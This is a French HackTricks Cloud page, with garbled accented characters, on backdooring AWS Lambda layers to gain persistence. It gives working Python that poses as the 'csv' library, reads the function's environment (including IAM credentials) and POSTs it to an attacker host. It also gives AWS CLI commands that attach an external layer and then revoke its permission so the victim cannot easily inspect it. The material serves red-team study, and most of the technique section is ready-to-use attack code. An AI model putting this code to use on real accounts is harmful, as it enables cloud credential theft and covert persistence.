# AWS - Persistance des couches Lambda

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Couches Lambda

Une couche Lambda est une archive de fichier .zip qui **peut contenir du code suppl√©mentaire** ou d'autres contenus. Une couche peut contenir des biblioth√®ques, un [runtime personnalis√©](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), des donn√©es ou des fichiers de configuration.

Il est possible d'inclure jusqu'√† **cinq couches par fonction**. Lorsque vous incluez une couche dans une fonction, les **contenus sont extraits dans le r√©pertoire `/opt`** de l'environnement d'ex√©cution.

Par **d√©faut**, les **couches** que vous cr√©ez sont **priv√©es** pour votre compte AWS. Vous pouvez choisir de **partager** une couche avec d'autres comptes ou de la **rendre** publique. Si vos fonctions consomment une couche publi√©e par un compte diff√©rent, vos fonctions peuvent **continuer √† utiliser la version de la couche apr√®s sa suppression, ou apr√®s la r√©vocation de votre autorisation d'acc√®s √† la couche**. Cependant, vous ne pouvez pas cr√©er une nouvelle fonction ou mettre √† jour des fonctions en utilisant une version de couche supprim√©e.

Les fonctions d√©ploy√©es en tant qu'image de conteneur n'utilisent pas de couches. Au lieu de cela, vous emballez votre runtime pr√©f√©r√©, les biblioth√®ques et autres d√©pendances dans l'image du conteneur lors de la construction de l'image.

### Chemin de chargement Python

Le chemin de chargement que Python utilisera dans Lambda est le suivant :
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
V√©rifiez comment les **deuxi√®me** et troisi√®me **positions** sont occup√©es par les r√©pertoires o√π les **couches lambda** d√©compressent leurs fichiers : **`/opt/python/lib/python3.9/site-packages`** et **`/opt/python`**

{% hint style="danger" %}
Si un attaquant parvient √† **installer une porte d√©rob√©e** dans une **couche lambda** utilis√©e ou **en ajouter une** qui **ex√©cutera du code arbitraire lorsqu'une biblioth√®que commune est charg√©e**, il pourra ex√©cuter du code malveillant √† chaque invocation de la lambda.
{% endhint %}

Par cons√©quent, les exigences sont les suivantes :

* **V√©rifier les biblioth√®ques** charg√©es par le code des victimes
* Cr√©er une **biblioth√®que proxy avec des couches lambda** qui ex√©cutera du code personnalis√© et chargera la biblioth√®que d'origine.

### Biblioth√®ques pr√©charg√©es

{% hint style="warning" %}
En abusant de cette technique, j'ai rencontr√© une difficult√© : Certaines biblioth√®ques sont **d√©j√† charg√©es** dans l'environnement d'ex√©cution Python lorsque votre code est ex√©cut√©. Je m'attendais √† trouver des choses comme `os` ou `sys`, mais **m√™me la biblioth√®que `json` √©tait charg√©e**.\
Pour abuser de cette technique de persistance, le code doit **charger une nouvelle biblioth√®que qui n'est pas d√©j√† charg√©e** lorsque le code est ex√©cut√©.
{% endhint %}

Avec un code Python comme celui-ci, il est possible d'obtenir la **liste des biblioth√®ques pr√©charg√©es** √† l'int√©rieur de l'environnement d'ex√©cution Python dans la lambda :
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
Et voici la **liste** (v√©rifiez que les biblioth√®ques telles que `os` ou `json` sont d√©j√† pr√©sentes)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
Et voici la liste des **biblioth√®ques** incluses par d√©faut dans **lambda**: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### Introduction d'une porte d√©rob√©e dans la couche Lambda

Dans cet exemple, supposons que le code cibl√© importe **`csv`**. Nous allons **introduire une porte d√©rob√©e dans l'import de la biblioth√®que `csv`**.

Pour ce faire, nous allons **cr√©er le r√©pertoire csv** avec le fichier **`__init__.py`** √† l'int√©rieur, dans un chemin charg√© par lambda : **`/opt/python/lib/python3.9/site-packages`**\
Ensuite, lorsque la lambda est ex√©cut√©e et tente de charger **csv**, notre fichier **`__init__.py` sera charg√© et ex√©cut√©**.\
Ce fichier doit :

* Ex√©cuter notre charge utile
* Charger la biblioth√®que csv d'origine

Nous pouvons faire les deux avec :
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
Ensuite, cr√©ez une archive zip avec ce code dans le chemin **`python/lib/python3.9/site-packages/__init__.py`** et ajoutez-le en tant que couche lambda.

Vous pouvez trouver ce code sur [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor)

La charge utile int√©gr√©e **enverra les informations d'identification IAM √† un serveur LA PREMI√àRE FOIS qu'elle est invoqu√©e ou APR√àS une r√©initialisation du conteneur lambda** (changement de code ou lambda froid), mais **d'autres techniques** telles que celles-ci pourraient √©galement √™tre int√©gr√©es:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### Couches Externes

Notez qu'il est possible d'utiliser **des couches lambda provenant de comptes externes**. De plus, une lambda peut utiliser une couche provenant d'un compte externe m√™me si elle n'a pas les autorisations.\
Notez √©galement que le **nombre maximal de couches qu'une lambda peut avoir est de 5**.

Par cons√©quent, pour am√©liorer la polyvalence de cette technique, un attaquant pourrait:

* Installer une porte d√©rob√©e dans une couche existante de l'utilisateur (rien n'est externe)
* **Cr√©er** une **couche** dans **son compte**, donner l'acc√®s du **compte de la victime** pour utiliser la couche, **configurer** la **couche** dans la lambda de la victime et **supprimer l'autorisation**.
* La **Lambda** pourra toujours **utiliser la couche** et la **victime** n'aura aucun moyen facile de **t√©l√©charger le code des couches** (√† part obtenir un shell invers√© √† l'int√©rieur de la lambda)
* La victime ne verra pas les couches externes utilis√©es avec **`aws lambda list-layers`**

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{% endcode %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks :

* Si vous voulez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
